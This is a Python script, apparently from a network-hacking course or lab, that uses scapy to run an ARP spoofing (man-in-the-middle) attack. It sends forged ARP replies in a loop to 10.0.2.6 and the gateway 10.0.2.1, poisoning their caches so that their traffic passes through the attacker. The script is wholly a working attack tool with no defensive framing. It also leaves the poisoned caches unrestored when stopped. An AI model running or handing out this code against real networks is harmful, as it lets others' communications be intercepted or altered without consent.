#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combined = broadcast/request
    ans_list = scapy.srp(combined, timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc


def send_spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    scapy.send(packet, verbose=False)

packets_sent = 0
try:
    while True:
        send_spoof('10.0.2.6', '10.0.2.1')
        send_spoof('10.0.2.1', '10.0.2.6')
        packets_sent += 2
        print('\rpackets sent = ' + str(packets_sent)),
        sys.stdout.flush()

        time.sleep(2)
except KeyboardInterrupt:
    print ('\r Ctrl + C quit.  ending spoof...       ')